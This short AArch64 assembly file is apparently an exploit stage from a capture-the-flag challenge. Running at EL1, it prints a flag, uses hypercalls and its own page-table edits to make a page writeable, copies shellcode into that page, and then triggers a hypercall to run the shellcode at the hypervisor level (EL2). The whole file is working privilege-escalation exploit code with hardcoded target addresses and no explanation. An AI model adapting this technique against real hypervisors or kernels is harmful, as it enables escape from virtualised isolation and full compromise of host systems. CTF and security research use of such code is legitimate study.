.section .text
.global _start
_start:

    # mapping for the first

    # Call the function to print EL1 flag
    ldr x0, =0xffffffffc0008408
    blr x0

    # Perform a hypercall to turn 0xffffffffc0001000 PTE to point to 0x40101000
    ldr x0, =1
    ldr x1, =0x14c3
    ldr x2, =0x100000
    hvc #0

    # Mark the page as writeable in my own page table
    ldr x0, =0x0
    ldr x1, =0xffffffffc001b000
    ldr x2, =0xffffffffc0001000
    ldr x3, =0x40000000001433
    ldr x8, =0xffffffffc0008750
    blr x8

    # Read in our el2 shellcode
    ldr x14, =0xffffffffc0001000
    ldr x15, =0xffffffffc0001ff0

loop:
    ldr x8, =0xffffffffc0009ad8
    blr x8
    str x0, [x14]
    add x14, x14, 1
    cmp x14, x15
    bne loop

    # Make hypercall to jump to our shellcode
    hvc #0
